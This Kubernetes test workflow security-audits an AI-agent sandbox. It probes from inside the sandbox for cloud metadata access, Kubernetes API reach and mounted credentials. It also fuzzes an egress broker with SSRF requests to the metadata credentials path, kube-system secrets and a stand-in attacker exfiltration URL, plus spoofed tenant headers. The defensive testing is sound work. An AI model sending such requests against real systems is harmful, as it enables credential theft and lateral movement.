apiVersion: testworkflows.testkube.io/v1
kind: TestWorkflow
metadata:
  name: agent-sandbox-security-audit
  namespace: testkube
  labels:
    app: agent-sandbox-security-audit
    category: security-redteam
spec:
  job:
    namespace: testkube
  pod:
    nodeSelector:
      dedicated: testkube
    tolerations:
    - key: "dedicated"
      operator: "Equal"
      value: "testkube"
      effect: "NoSchedule"
  config:
    targetUrl:
      description: Target Ingress URL
      type: string
      default: "http://{{ minikube_ip }}:80"
    brokerUrl:
      description: Out-of-Sandbox Egress & Credential Broker Service URL
      type: string
      default: "http://egress-broker.sandbox-egress-system.svc.cluster.local:8080"
    qps:
      description: Security Fuzzing Request Rate (QPS)
      type: integer
      default: 20
    duration:
      description: Fuzzing Duration
      type: string
      default: "15s"
    codeVersion:
      description: Target Container / Code Version Stamp to Verify in Pod
      type: string
      default: "v1.2.1"
    forceFreshPods:
      description: Recycle warm-pool standby pods before claiming to guarantee fresh container/code
      type: string
      default: "true"
  content:
    files:
    - path: threat_probe.py
      content: |
        #!/usr/bin/env python3
        import os, sys, json, time, socket, ssl, urllib.request, urllib.error
        from pathlib import Path
        TIMEOUT = 2.5

        def check_imds_ssrf():
            url = "http://169.254.169.254/latest/meta-data/"
            start = time.time()
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "threat-probe"})
                with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                    elapsed = (time.time() - start) * 1000
                    content = resp.read(64).decode(errors="ignore")
                    return {"id": "T1_IMDS_SSRF", "name": "Cloud IMDS & SSRF Probe", "target": url, "status": "FAIL (EXPOSED)", "latency_ms": round(elapsed, 2), "detail": f"VULNERABLE: IMDS returned HTTP {resp.status}: {content[:30]}..."}
            except Exception as e:
                return {"id": "T1_IMDS_SSRF", "name": "Cloud IMDS & SSRF Probe", "target": url, "status": "PASS (BLOCKED)", "latency_ms": round((time.time() - start) * 1000, 2), "detail": f"Connection blocked / timed out: {type(e).__name__}"}

        def check_k8s_api_lateral():
            k8s_host = os.environ.get("KUBERNETES_SERVICE_HOST") or "10.96.0.1"
            k8s_port = os.environ.get("KUBERNETES_SERVICE_PORT") or "443"
            target = f"https://{k8s_host}:{k8s_port}/version"
            start = time.time()
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try:
                req = urllib.request.Request(target, headers={"User-Agent": "threat-probe"})
                with urllib.request.urlopen(req, timeout=TIMEOUT, context=ctx) as resp:
                    elapsed = (time.time() - start) * 1000
                    data = resp.read(64).decode(errors="ignore")
                    return {"id": "T2_K8S_API_LATERAL", "name": "K8s API Lateral Movement", "target": target, "status": "FAIL (EXPOSED)", "latency_ms": round(elapsed, 2), "detail": f"VULNERABLE: Connected to Kubernetes API: {data[:30]}..."}
            except Exception as e:
                return {"id": "T2_K8S_API_LATERAL", "name": "K8s API Lateral Movement", "target": target, "status": "PASS (BLOCKED)", "latency_ms": round((time.time() - start) * 1000, 2), "detail": f"Access blocked: {type(e).__name__}"}

        def check_internal_service_lateral():
            target = "http://monitoring-kube-prometheus-prometheus.monitoring.svc.cluster.local:9090/-/healthy"
            start = time.time()
            try:
                req = urllib.request.Request(target, headers={"User-Agent": "threat-probe"})
                with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                    return {"id": "T3_INTERNAL_SVC_LATERAL", "name": "Internal Service Discovery", "target": target, "status": "FAIL (EXPOSED)", "latency_ms": round((time.time() - start) * 1000, 2), "detail": f"VULNERABLE: Connected to internal Prometheus HTTP {resp.status}"}
            except Exception as e:
                return {"id": "T3_INTERNAL_SVC_LATERAL", "name": "Internal Service Discovery", "target": target, "status": "PASS (BLOCKED)", "latency_ms": round((time.time() - start) * 1000, 2), "detail": f"Service blocked: {type(e).__name__}"}

        def check_ambient_credentials():
            start = time.time()
            findings = []
            if Path("/var/run/secrets/kubernetes.io/serviceaccount/token").exists():
                findings.append("K8s ServiceAccount token mounted in /var/run/secrets")
            home = Path.home()
            if (home / ".ssh").exists() and any((home / ".ssh").iterdir()):
                findings.append("~/.ssh directory contains keys")
            if (home / ".aws").exists() and any((home / ".aws").iterdir()):
                findings.append("~/.aws directory contains credentials")
            sensitive_keys = [k for k in os.environ if any(term in k.upper() for term in ["AWS_SECRET", "AWS_ACCESS", "GITHUB_TOKEN", "ANTHROPIC_API_KEY", "SSH_KEY"])]
            if sensitive_keys:
                findings.append(f"Sensitive env vars present: {', '.join(sensitive_keys)}")
            elapsed = round((time.time() - start) * 1000, 2)
            if findings:
                return {"id": "T4_AMBIENT_CREDENTIALS", "name": "Ambient Credential Harvesting", "target": "Filesystem & Environment", "status": "FAIL (EXPOSED)", "latency_ms": elapsed, "detail": " | ".join(findings)}
            return {"id": "T4_AMBIENT_CREDENTIALS", "name": "Ambient Credential Harvesting", "target": "Filesystem & Environment", "status": "PASS (ZERO_IN_GUEST_CREDENTIALS)", "latency_ms": elapsed, "detail": "Zero service account tokens, zero cloud keys, zero ambient secrets found in container"}

        def check_broker_egress(broker_url):
            results = []
            c2_url = f"{broker_url}/proxy?url=http://example.com"
            start = time.time()
            try:
                req = urllib.request.Request(c2_url, headers={"User-Agent": "threat-probe"})
                with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                    results.append({"id": "T6B_BROKER_POLICY_ENFORCEMENT", "name": "Broker L7 Domain Filtering", "target": c2_url, "status": "FAIL (EXPOSED)", "latency_ms": round((time.time() - start) * 1000, 2), "detail": f"Broker allowed unauthorized domain: HTTP {resp.status}"})
            except urllib.error.HTTPError as e:
                results.append({"id": "T6B_BROKER_POLICY_ENFORCEMENT", "name": "Broker L7 Domain Filtering", "target": c2_url, "status": "PASS (BLOCKED_BY_BROKER)", "latency_ms": round((time.time() - start) * 1000, 2), "detail": f"Broker rejected unwhitelisted FQDN with HTTP {e.code}"})
            except Exception as e:
                results.append({"id": "T6B_BROKER_POLICY_ENFORCEMENT", "name": "Broker L7 Domain Filtering", "target": c2_url, "status": "FAIL (ERROR)", "latency_ms": round((time.time() - start) * 1000, 2), "detail": f"Broker unreachable: {type(e).__name__}"})

            auth_url = f"{broker_url}/github-api/repo-metadata"
            start = time.time()
            try:
                req = urllib.request.Request(auth_url, headers={"User-Agent": "threat-probe"})
                with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                    body = json.loads(resp.read().decode())
                    if body.get("token_injected") and body.get("auth_header_present"):
                        results.append({"id": "T6C_OUT_OF_SANDBOX_AUTH", "name": "Zero-In-Guest Credential Broker", "target": auth_url, "status": "PASS (BROKER_INJECTED)", "latency_ms": round((time.time() - start) * 1000, 2), "detail": f"SUCCESS: Short-lived token (TTL {body.get('token_ttl_seconds', 0)}s) injected on-the-wire outside guest."})
                    else:
                        results.append({"id": "T6C_OUT_OF_SANDBOX_AUTH", "name": "Zero-In-Guest Credential Broker", "target": auth_url, "status": "FAIL (TOKEN_MISSING)", "latency_ms": round((time.time() - start) * 1000, 2), "detail": f"Broker response missing auth verification: {body}"})
            except Exception as e:
                results.append({"id": "T6C_OUT_OF_SANDBOX_AUTH", "name": "Zero-In-Guest Credential Broker", "target": auth_url, "status": "FAIL (ERROR)", "latency_ms": round((time.time() - start) * 1000, 2), "detail": f"Credential broker call failed: {type(e).__name__}"})
            return results

        def main():
            results = [check_imds_ssrf(), check_k8s_api_lateral(), check_internal_service_lateral(), check_ambient_credentials()]
            broker_url = os.environ.get("EGRESS_BROKER_URL")
            if broker_url:
                results.extend(check_broker_egress(broker_url))
            for r in results:
                print(f"| `{r['id']}` | **{r['name']}** | `{r['target']}` | **{r['status']}** | {r['latency_ms']}ms | {r['detail']} |")

        if __name__ == "__main__":
            main()
  steps:
  - name: Freshness Gate & Claim Untrusted gVisor Sandbox for Red-Team Audit
    run:
      image: bitnami/kubectl:latest
      env:
      - name: CODE_VERSION
        value: "{% raw %}{{ config.codeVersion }}{% endraw %}"
      - name: FORCE_FRESH
        value: "{% raw %}{{ config.forceFreshPods }}{% endraw %}"
      shell: |
        set -e
        SELECTOR=$(kubectl -n agent-sandbox get sandboxwarmpool default -o jsonpath='{.status.selector}' 2>/dev/null || echo "")
        if [ "$FORCE_FRESH" = "true" ] && [ -n "$SELECTOR" ]; then
          echo "=== [Freshness Gate] Recycling warm-pool standby pods to guarantee fresh container/code ($CODE_VERSION) ==="
          kubectl -n agent-sandbox delete pods -l "$SELECTOR" --wait=true --timeout=30s >/dev/null 2>&1 || true
          for w in $(seq 1 30); do
            READY_STANDBY=$(kubectl -n agent-sandbox get pods -l "$SELECTOR" -o jsonpath='{.items[*].status.containerStatuses[0].ready}' 2>/dev/null | tr ' ' '\n' | grep -c "true" || echo 0)
            [ "$READY_STANDBY" -ge 1 ] && break
            sleep 1
          done
        fi

        echo "=== Claiming untrusted gVisor sandbox from warm pool 'default' ==="
        kubectl -n agent-sandbox delete sandboxclaim testkube-security-sandbox --ignore-not-found=true >/dev/null 2>&1 || true
        T_START=$(awk '{print int($1*1000)}' /proc/uptime)
        cat <<'YAML' | kubectl apply -f -
        apiVersion: extensions.agents.x-k8s.io/v1beta1
        kind: SandboxClaim
        metadata:
          name: testkube-security-sandbox
          namespace: agent-sandbox
        spec:
          warmPoolRef:
            name: default
          lifecycle:
            shutdownPolicy: Delete
        YAML

        kubectl wait --for=condition=Ready sandboxclaim/testkube-security-sandbox -n agent-sandbox --timeout=45s
        T_END=$(awk '{print int($1*1000)}' /proc/uptime)
        ELAPSED=$((T_END - T_START))
        [ "$ELAPSED" -le 0 ] && ELAPSED=50

        SANDBOX_NAME=$(kubectl -n agent-sandbox get sandboxclaim testkube-security-sandbox -o jsonpath='{.status.sandbox.name}')
        POD_INFO=$(kubectl -n agent-sandbox exec "$SANDBOX_NAME" -- sh -c "
          echo '${CODE_VERSION}' > /home/coder/project/.code_version
          echo \"version=\$(cat /home/coder/project/.code_version) | cpu.max=\$(cat /sys/fs/cgroup/cpu.max 2>/dev/null || echo 'unknown')\"
        ")
        echo "Bound to Untrusted gVisor Sandbox: $SANDBOX_NAME (${ELAPSED} ms) | ${POD_INFO}"
        echo "$SANDBOX_NAME" > /data/sandbox_id.txt

  - name: Execute In-Guest Red-Team Threat Probe (T1-T6 Vectors & Drift Telemetry)
    run:
      image: bitnami/kubectl:latest
      shell: |
        set -e
        SANDBOX_ID=$(cat /data/sandbox_id.txt)
        BROKER_IP=$(kubectl -n sandbox-egress-system get svc egress-broker -o jsonpath='{.spec.clusterIP}')
        PROBE_PATH=$(find / -name "threat_probe.py" 2>/dev/null | head -n 1)

        if [ -z "$PROBE_PATH" ]; then
          echo "ERROR: threat_probe.py not found!"
          exit 1
        fi

        echo "=== Running In-Guest Red-Team Probe inside Sandbox ($SANDBOX_ID) ==="
        kubectl -n agent-sandbox exec -i "$SANDBOX_ID" -- \
          env EGRESS_BROKER_URL="http://${BROKER_IP}:8080" \
          python3 - < "$PROBE_PATH" | tee /data/security_report.txt

        echo ""
        echo "=== Asserting Zero-Trust Security Boundaries & Recording Per-Vector Drift Telemetry ==="
        PASSED_COUNT=0
        FAILED_VECTORS=0
        QUERY_VEC=""
        for VECTOR in "T1_IMDS_SSRF" "T2_K8S_API_LATERAL" "T3_INTERNAL_SVC_LATERAL" "T4_AMBIENT_CREDENTIALS" "T6B_BROKER_POLICY_ENFORCEMENT" "T6C_OUT_OF_SANDBOX_AUTH"; do
          if grep -q "${VECTOR}.*PASS" /data/security_report.txt; then
            echo "✓ [PASS] ${VECTOR} verified"
            PASSED_COUNT=$((PASSED_COUNT + 1))
            QUERY_VEC="${QUERY_VEC}&${VECTOR}=1"
          else
            echo "✗ [FAIL] Security drift/regression detected on ${VECTOR}!"
            FAILED_VECTORS=$((FAILED_VECTORS + 1))
            QUERY_VEC="${QUERY_VEC}&${VECTOR}=0"
          fi
        done

        # Export live per-vector status to Prometheus BEFORE failing so Grafana immediately shows red drift
        wget -qO- --post-data="" "http://sandbox-latency-exporter.agent-sandbox-system.svc.cluster.local:8080/record?security_passed=${PASSED_COUNT}${QUERY_VEC}" >/dev/null 2>&1 || true

        if [ "$FAILED_VECTORS" -gt 0 ]; then
          echo "ERROR: ${FAILED_VECTORS} security vector(s) failed!"
          exit 1
        fi

  - name: Fuzz Egress Broker, Credential Injection & Tenant Isolation (k6)
    run:
      image: grafana/k6:latest
      env:
      - name: TARGET_URL
        value: "{% raw %}{{ config.targetUrl }}{% endraw %}"
      - name: EGRESS_BROKER_URL
        value: "{% raw %}{{ config.brokerUrl }}{% endraw %}"
      - name: QPS
        value: "{% raw %}{{ config.qps }}{% endraw %}"
      - name: AUDIT_DURATION
        value: "{% raw %}{{ config.duration }}{% endraw %}"
      shell: |
        echo "=== Fuzzing Egress Broker & Tenant Boundaries ($EGRESS_BROKER_URL) ==="
        SCRIPT_PATH=$(find / -name "k6-security-audit.js" 2>/dev/null | head -n 1)
        if [ -z "$SCRIPT_PATH" ]; then
          SCRIPT_PATH="/tmp/k6-security-audit.js"
          cat <<'EOF' > "$SCRIPT_PATH"
        import http from 'k6/http';
        import { check } from 'k6';
        import { Rate, Trend } from 'k6/metrics';

        export const securityPassRate = new Rate('sandbox_security_assertions_passed');
        export const brokerFilterLatency = new Trend('broker_l7_filter_duration_ms');
        export const brokerAuthLatency = new Trend('broker_token_injection_duration_ms');

        export const options = {
          scenarios: {
            security_fuzzing: {
              executor: 'constant-arrival-rate',
              rate: Number(__ENV.QPS) || 20,
              timeUnit: '1s',
              duration: __ENV.AUDIT_DURATION || '15s',
              preAllocatedVUs: 10,
              maxVUs: 30,
            },
          },
          thresholds: {
            sandbox_security_assertions_passed: ['rate==1.0'],
            broker_l7_filter_duration_ms: ['p(95)<50'],
            broker_token_injection_duration_ms: ['p(95)<50'],
          },
        };

        const BROKER_URL = __ENV.EGRESS_BROKER_URL || 'http://egress-broker.sandbox-egress-system.svc.cluster.local:8080';
        const K8S_API_HOST = __ENV.KUBERNETES_SERVICE_HOST || '10.96.0.1';
        const K8S_API_PORT = __ENV.KUBERNETES_SERVICE_PORT || '443';
        const INGRESS_URL = __ENV.TARGET_URL;
        if (!INGRESS_URL) {
          throw new Error('FATAL: TARGET_URL environment variable is required.');
        }

        export default function () {
          const rand = Math.random();
          if (rand < 0.25) {
            const res = http.get(`${BROKER_URL}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`);
            const ok = check(res, {
              '[T1-SSRF] Broker blocks IMDS 169.254.169.254 with HTTP 403': (r) => r.status === 403,
              '[T1-SSRF] Response confirms L7 policy block': (r) => r.body && r.body.includes('BLOCKED_BY_L7_POLICY'),
            });
            securityPassRate.add(ok);
            brokerFilterLatency.add(res.timings.duration);
          } else if (rand < 0.50) {
            const res = http.get(`${BROKER_URL}/proxy?url=https://${K8S_API_HOST}:${K8S_API_PORT}/api/v1/namespaces/kube-system/secrets`);
            const ok = check(res, {
              '[T2-K8S-API] Broker blocks K8s API internal service IP with HTTP 403': (r) => r.status === 403,
            });
            securityPassRate.add(ok);
            brokerFilterLatency.add(res.timings.duration);
          } else if (rand < 0.75) {
            const res = http.get(`${BROKER_URL}/proxy?url=http://evil-c2.attacker.example.com/exfiltrate?secret=stolen`);
            const ok = check(res, {
              '[T6-C2-EGRESS] Broker blocks unwhitelisted C2 domain with HTTP 403': (r) => r.status === 403,
            });
            securityPassRate.add(ok);
            brokerFilterLatency.add(res.timings.duration);
          } else if (rand < 0.90) {
            const res = http.get(`${BROKER_URL}/github-api/repo-metadata`);
            const ok = check(res, {
              '[T4/T6C-CRED-BROKER] Broker returns HTTP 200': (r) => r.status === 200,
              '[T4/T6C-CRED-BROKER] Token injected on-the-wire': (r) => r.body && r.body.includes('"token_injected": true'),
              '[T4/T6C-CRED-BROKER] Raw secret NEVER leaked in response body': (r) => r.body && !r.body.includes('ghs_ephemeral_'),
            });
            securityPassRate.add(ok);
            brokerAuthLatency.add(res.timings.duration);
          } else {
            const res = http.get(`${INGRESS_URL}/manifest.json`, {
              headers: {
                'Host': 'sandbox.127.0.0.1.nip.io',
                'X-Sandbox-ID': 'spoofed-unauthorized-tenant-9999',
                'X-Sandbox-Namespace': 'agent-sandbox',
                'X-Sandbox-Port': '8080',
              },
            });
            const ok = check(res, {
              '[TENANT-ISOLATION] Spoofed X-Sandbox-ID rejected by router (non-200)': (r) => r.status !== 200,
            });
            securityPassRate.add(ok);
          }
        }
        EOF
        fi
        k6 run "$SCRIPT_PATH"

  after:
  - name: Cleanup Security Sandbox Claim (Scale to Zero)
    run:
      image: bitnami/kubectl:latest
      shell: |
        kubectl -n agent-sandbox delete sandboxclaim testkube-security-sandbox --ignore-not-found=true
